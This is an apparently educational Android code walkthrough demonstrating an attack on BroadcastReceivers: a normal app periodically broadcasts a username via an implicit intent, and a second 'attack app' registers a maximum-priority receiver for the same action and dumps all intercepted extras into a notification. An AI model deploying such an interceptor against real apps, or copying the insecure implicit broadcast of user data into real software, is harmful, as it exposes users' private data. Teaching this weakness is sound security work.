/*
attack on BroadcastReceiver Android
*/

 
1-// normal App
A- Add these lines in application tag in manifest.xml
  <!-- register the broadcast to listen to action names com.example.Broadcast-->
        <receiver android:name=".MyReceiver" android:priority="2147483647" >
            <intent-filter>
                <action android:name="com.example.Broadcast" >
                </action>
            </intent-filter>
        </receiver>
 <!-- register the service-->
        <service
            android:name=".ServiceNotification"
            android:exported="false" >
        </service>

B- Add services class
public class ServiceNotification extends IntentService {
   public static boolean ServiceIsRun=false;

    public ServiceNotification() {
        super("MyWebRequestService");
    }
    protected void onHandleIntent(Intent workIntent) {

        // continue sending the messages
        while ( ServiceIsRun) {
             // creat new intent
            Intent intent = new Intent();
            //set the action that will receive our broadcast
            intent.setAction("com.example.Broadcast");
            // add data to the bundle
            intent.putExtra("username", "alxs1aa");
            // send the data to broadcast
            sendBroadcast(intent);
            //delay for 50000ms
            try{
                Thread.sleep(50000);
            }catch (Exception ex){}


        }
    }


}

C-Add BroadcastReceiver Class

/**
 * Created by hussienalrubaye on 3/6/16.
 */
public class MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        // get the bundles in the message
        final Bundle bundle = intent.getExtras();
        // check the action equal to the action we fire in broadcast,
        if   (   intent.getAction().equalsIgnoreCase("com.example.Broadcast"))
            //read the data from the intent
            Toast.makeText(context,bundle.getString("username"),Toast.LENGTH_LONG).show();
    }
}
//Start service from main activity
 // check if the services is already runs in background
        if(ServiceNotification.ServiceIsRun==false ) {
            ServiceNotification.ServiceIsRun  = true;
            //register the services to run in background
            Intent intent = new Intent(this, ServiceNotification.class);
            // start the services
            startService(intent);

        }


2-// attack app
A- Add these lines in application tag in manifest.xml

 <!-- Register broadcast to listen to broadcast action names com.example.Broadcast-->
        <receiver
            android:name=".MyReceiver"
            android:priority="2147483647">
            <intent-filter>
                <action android:name="com.example.Broadcast"></action>
            </intent-filter>
        </receiver>

B-Add BroadcastReceiver Class

public class  MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
         String DataBundel="";
        // get app the data sent on bundle
        Bundle bundle= intent.getExtras();
        //lopp through all keys in the bundle
        for (String key : bundle.keySet()) {
            // get object by key( we define object became it may be text or image or whatever
            Object value = bundle.get(key);
            //get all keys
            DataBundel+= String.format("%s %s (%s)", key, value.toString(), value.getClass().getName());
        }
        //display notify message to the user
        NewMessageNotification NotifyMe=new NewMessageNotification();
        NotifyMe.notify(  context, DataBundel, 123);

    }
}

C- Add Notification class from (Right click on Java packge code when main activity are located->new ->UI component-> Notification)then name the class with  name "NewMessageNotification"



